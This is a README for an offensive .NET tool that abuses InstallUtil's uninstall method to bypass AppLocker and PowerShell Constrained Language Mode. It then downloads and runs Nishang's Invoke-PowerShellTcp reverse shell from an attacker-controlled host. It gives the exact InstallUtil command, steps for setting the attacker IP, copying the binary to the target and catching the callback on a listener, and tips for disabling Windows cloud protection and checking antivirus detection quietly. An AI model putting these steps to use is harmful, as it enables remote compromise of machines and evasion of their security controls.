## Bypass for Applocker and Powershell Constrained Language Mode via InstallUtil Uninstaller Method to run Nishang Invoke-PowerShellTcp.ps1

----


## Usage

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe  /LogToConsole=true /U C:\Users\root\Desktop\installdamn.exe
			
Steps

  1)Build the project after changing the ip (lhost , ip youre serving the shellcode from) and script name ("damn" , change the name to name of your Invoke-PowerShellTcp.ps1 instance )
  2)Transfer the build exe to the rhost 
  3)run the listener on lhost to the configured port on Invoke-PowerShellTcp.ps1 instance
  4)Run the executable using InstallUtil -  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe  /LogToConsole=true /U C:\Users\root\Desktop\installdamn.exe
  5)Check on the lhost http server for a call back and your listener		
						
```

## Compile Instructions

This Project has been built against .NET 4.0 x64 and is compatible with [Visual Studio 2019 Community Edition]. Simply open up the project .sln, choose "release", and build before the required changes
.

## Notes
* when testing on a windows machine , disable the "Cloud Delivered Protection"
* Use https://antiscan.me/ instead of virus total if you wanna validate the signatures
* You could run any code to bypass Applocker and Powershell constrained language mode via "public class SharpUp : System.Configuration.Install.Installer" method change the "damn" script to the the powershell .ps1 script , you wanna run

## Shout Out

[nikhil_mitt](https://twitter.com/nikhil_mitt)

* https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1




